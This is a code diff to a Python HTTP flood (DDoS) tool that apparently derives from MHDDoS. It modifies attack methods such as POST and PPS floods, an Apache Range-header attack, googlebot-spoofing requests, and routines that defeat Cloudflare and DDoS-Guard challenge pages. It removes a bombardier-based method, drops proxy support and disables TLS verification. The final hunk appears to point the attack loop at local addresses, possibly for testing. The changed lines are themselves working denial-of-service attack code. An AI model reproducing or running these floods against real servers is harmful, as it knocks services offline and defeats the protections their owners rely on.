@@ -30,7 +30,6 @@ from socket import (
 )
 from ssl import CERT_NONE, SSLContext, create_default_context
 from struct import pack as data_pack
-from subprocess import PIPE, run
 from sys import argv
 from sys import exit as _exit
 from threading import Event, Thread
@@ -39,9 +38,10 @@ from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
 
+import urllib3
 import yarl
 from certifi import where
-from cloudscraper import create_scraper
+from cloudscraper import CloudScraper, create_scraper
 from dns import resolver
 from icmplib import ping
 from impacket.ImpactPacket import ICMP, IP, TCP, UDP, Data
@@ -56,6 +56,7 @@ logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
+urllib3.disable_warnings()
 
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
@@ -147,7 +148,6 @@ class Methods:
         "APACHE",
         "XMLRPC",
         "BOT",
-        "BOMB",
         "DOWNLOADER",
         "KILLER",
         "TOR",
@@ -257,13 +257,11 @@ class Tools:
         return True
 
     @staticmethod
-    def dgb_solver(url, ua, pro=None):
-        s = None
+    def dgb_solver(url: str, ua: str, host: str) -> Session:
         idss = None
         with Session() as s:
-            if pro:
-                s.proxies = pro
             hdrs = {
+                "Host": host,
                 "User-Agent": ua,
                 "Accept": "text/html",
                 "Accept-Language": "en-US",
@@ -275,10 +273,11 @@ class Tools:
                 "TE": "trailers",
                 "DNT": "1",
             }
-            with s.get(url, headers=hdrs) as ss:
+            with s.get(url, headers=hdrs, verify=False) as ss:
                 for key, value in ss.cookies.items():
                     s.cookies.set_cookie(cookies.create_cookie(key, value))
             hdrs = {
+                "Host": host,
                 "User-Agent": ua,
                 "Accept": "*/*",
                 "Accept-Language": "en-US,en;q=0.5",
@@ -288,13 +287,14 @@ class Tools:
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site",
             }
-            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
+            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs, verify=False) as ss:
                 for key, value in ss.cookies.items():
                     if key == "__ddg2":
                         idss = value
                     s.cookies.set_cookie(cookies.create_cookie(key, value))
 
             hdrs = {
+                "Host": host,
                 "User-Agent": ua,
                 "Accept": "image/webp,*/*",
                 "Accept-Language": "en-US,en;q=0.5",
@@ -305,12 +305,10 @@ class Tools:
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site",
             }
-            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
+            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs, verify=False) as ss:
                 for key, value in ss.cookies.items():
                     s.cookies.set_cookie(cookies.create_cookie(key, value))
                 return s
-
-        return False
 
     @staticmethod
     def safe_close(sock=None):
@@ -765,7 +763,7 @@ class HttpFlood(Thread):
         self._method = method
         self._target = target
         self._host = host
-        self._raw_target = (self._host, (self._target.port or 80))
+        self._raw_target = (self._target.host, self._target.port)
         self._ip_list = ip_list
 
         self.methods = {
@@ -790,7 +788,6 @@ class HttpFlood(Thread):
             "TOR": self.TOR,
             "EVEN": self.EVEN,
             "DOWNLOADER": self.DOWNLOADER,
-            # "BOMB": self.BOMB,
             "PPS": self.PPS,
             "KILLER": self.KILLER,
         }
@@ -893,14 +890,14 @@ class HttpFlood(Thread):
         return str.encode(
             (
                 self._payload
-                + f"Host: {self._target.authority}\r\n"
+                + f"Host: {randchoice([self._host, self._target.authority])}\r\n"
                 + self.randHeadercontent
                 + (other if other else "")
                 + "\r\n"
             )
         )
 
-    def open_connection(self, host=None) -> socket:
+    def open_connection(self, host: tuple[str, int] = None) -> socket:
         if self._proxies:
             sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
         else:
@@ -916,7 +913,7 @@ class HttpFlood(Thread):
         if self._target.scheme.lower() == "https":
             sock = ctx.wrap_socket(
                 sock,
-                server_hostname=host[0] if host else self._target.host,
+                server_hostname=self._host,
                 server_side=False,
                 do_handshake_on_connect=True,
                 suppress_ragged_eofs=True,
@@ -955,7 +952,7 @@ class HttpFlood(Thread):
         elif {method.upper()} & {"GSB", "HEAD"}:
             return "HEAD"
         else:
-            return "REQUESTS"
+            return "PUT"
 
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
@@ -966,7 +963,7 @@ class HttpFlood(Thread):
                 '{"data": %s}'
             )
             % ProxyTools.Random.rand_str(32)
-        )[:-2]
+        )
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -995,7 +992,7 @@ class HttpFlood(Thread):
                 '{"data": %s}'
             )
             % ProxyTools.Random.rand_str(512)
-        )[:-2]
+        )
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1022,7 +1019,7 @@ class HttpFlood(Thread):
 
     def APACHE(self) -> None:
         payload: bytes = self.generate_payload(
-            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024))
+            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)) + "\r\n\r\n"
         )
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -1051,7 +1048,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def PPS(self) -> None:
-        payload: Any = str.encode(self._defaultpayload + f"Host: {self._target.authority}\r\n\r\n")
+        payload: Any = str.encode(self._defaultpayload + f"Host: {self._host}\r\n\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1074,18 +1071,20 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload()
         p1, p2 = str.encode(
             "GET /robots.txt HTTP/1.1\r\n"
-            "Host: %s\r\n" % self._target.raw_authority + "Connection: Keep-Alive\r\n"
+            f"Host: {self._host}\r\n"
+            "Connection: Keep-Alive\r\n"
             "Accept: text/plain,text/html,*/*\r\n"
             "User-Agent: %s\r\n" % randchoice(google_agents)
             + "Accept-Encoding: gzip,deflate,br\r\n\r\n"
         ), str.encode(
             "GET /sitemap.xml HTTP/1.1\r\n"
-            "Host: %s\r\n" % self._target.raw_authority + "Connection: Keep-Alive\r\n"
+            f"Host: {self._host}\r\n"
+            "Connection: Keep-Alive\r\n"
             "Accept: */*\r\n"
             "From: googlebot(at)googlebot.com\r\n"
             "User-Agent: %s\r\n" % randchoice(google_agents)
             + "Accept-Encoding: gzip,deflate,br\r\n"
-            "If-None-Match: %s-%s\r\n"
+            'If-None-Match: "%s-%s"\r\n'
             % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4))
             + "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
         )
@@ -1115,19 +1114,11 @@ class HttpFlood(Thread):
 
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-        s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
-                if pro:
-                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
+                with s.get(
+                    self._target.human_repr(), headers={"Host": self._host}, verify=False
+                ) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
@@ -1157,24 +1148,14 @@ class HttpFlood(Thread):
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
-            if self._proxies:
-                pro = randchoice(self._proxies)
-                with Tools.dgb_solver(
-                    self._target.human_repr(), randchoice(self._useragents), pro.asRequest()
-                ) as ss:
-                    for _ in range(min(self._rpc, 5)):
-                        sleep(min(self._rpc, 5) / 100)
-                        with ss.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SEND += Tools.sizeOfRequest(res)
-                            continue
-
-                Tools.safe_close(ss)
-
-            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
+            with Tools.dgb_solver(
+                self._target.human_repr(), randchoice(self._useragents), self._host
+            ) as ss:
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
-                    with ss.get(self._target.human_repr()) as res:
+                    with ss.get(
+                        self._target.human_repr(), headers={"Host": self._host}, verify=False
+                    ) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
 
@@ -1210,19 +1191,11 @@ class HttpFlood(Thread):
 
     def BYPASS(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-        s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
-                if pro:
-                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
+                with s.get(
+                    self._target.human_repr(), headers={"Host": self._host}, verify=False
+                ) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
@@ -1231,7 +1204,7 @@ class HttpFlood(Thread):
         payload = str.encode(
             "%s %s?qs=%s HTTP/1.1\r\n"
             % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
-            + "Host: %s\r\n" % self._target.authority
+            + "Host: %s\r\n" % self._host
             + self.randHeadercontent
             + "Accept-Encoding: gzip, deflate, br\r\n"
             "Accept-Language: en-US,en;q=0.9\r\n"
@@ -1254,8 +1227,8 @@ class HttpFlood(Thread):
     def RHEX(self):
         randhex = str(randbytes(randchoice([32, 64, 128])))
         payload = str.encode(
-            "%s %s/%s HTTP/1.1\r\n" % (self._req_type, self._target.authority, randhex)
-            + "Host: %s/%s\r\n" % (self._target.authority, randhex)
+            "%s %s/%s HTTP/1.1\r\n" % (self._req_type, self._target, randhex)
+            + "Host: %s/%s\r\n" % (self._target.host, randhex)
             + self.randHeadercontent
             + "Accept-Encoding: gzip, deflate, br\r\n"
             "Accept-Language: en-US,en;q=0.9\r\n"
@@ -1303,12 +1276,12 @@ class HttpFlood(Thread):
             r"\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA "
         )
         p1, p2 = str.encode(
-            "%s %s/%s HTTP/1.1\r\n" % (self._req_type, self._target.authority, hexh)
-            + "Host: %s/%s\r\n" % (self._target.authority, hexh)
+            "%s %s/%s HTTP/1.1\r\n" % (self._req_type, self._target, hexh)
+            + "Host: %s/%s\r\n" % (self._target.host, hexh)
             + self.randHeadercontent
             + dep
         ), str.encode(
-            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type, self._target.authority)
+            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type, self._target)
             + "Host: %s\r\n" % hexh
             + self.randHeadercontent
             + dep
@@ -1323,7 +1296,7 @@ class HttpFlood(Thread):
     def NULL(self) -> None:
         payload: Any = str.encode(
             self._payload
-            + f"Host: {self._target.authority}\r\n"
+            + f"Host: {self._host}\r\n"
             + "User-Agent: null\r\n"
             + "Referrer: null\r\n"
             + self.SpoofIP
@@ -1334,34 +1307,6 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
-
-    # def BOMB(self):
-    #     assert self._proxies, (
-    #         "This method requires proxies. "
-    #         "Without proxies you can use github.com/codesenberg/bombardier"
-    #     )
-    #
-    #     while True:
-    #         proxy = randchoice(self._proxies)
-    #         if proxy.type != ProxyType.SOCKS4:
-    #             break
-    #
-    #     res = run(
-    #         [
-    #             f"{bombardier_path}",
-    #             f"--connections={self._rpc}",
-    #             "--http2",
-    #             "--method=GET",
-    #             "--latencies",
-    #             "--timeout=30s",
-    #             f"--requests={self._rpc}",
-    #             f"--proxy={proxy}",
-    #             f"{self._target.human_repr()}",
-    #         ],
-    #         stdout=PIPE,
-    #     )
-    #     if self._thread_id == 0:
-    #         print(proxy, res.stdout.decode(), sep="\n")
 
     def SLOW(self):
         payload: bytes = self.generate_payload()
@@ -1698,11 +1643,11 @@ if __name__ == "__main__":
             parser.add_argument("--rpc", type=int, default=1)
             parser.add_argument("--duration", type=int, default=1)
             parser.add_argument("--interface", type=str, default="interface")
+            parser.add_argument("--hostname", type=str, default="localhost")
             arguments = parser.parse_args()
 
             URL = yarl.URL(arguments.url)
-            HOST = gethostbyname(URL.host)
-            HOST_FOR_TOR_METHOD = URL.host
+            HOST = arguments.hostname
             THREADS = arguments.threads
             CONNS = arguments.conns
             RPC = arguments.rpc
@@ -1733,7 +1678,7 @@ if __name__ == "__main__":
             EVENT = Event()
             EVENT.clear()
 
-            LAYER7_METHODS = {
+            VALID_L7_METHODS = {
                 "GET",
                 "POST",
                 "OVH",
@@ -1758,10 +1703,9 @@ if __name__ == "__main__":
                 "CFBUAM",
                 "BYPASS",
                 "KILLER",
-                "TOR",
             }
 
-            for i, method in enumerate(LAYER7_METHODS):  # Methods.LAYER7_METHODS:
+            for i, method in enumerate(VALID_L7_METHODS):
                 ip_list = [f"127.10.{i}.{n}" for n in range(CONNS)]
 
                 for thread_id in range(THREADS):
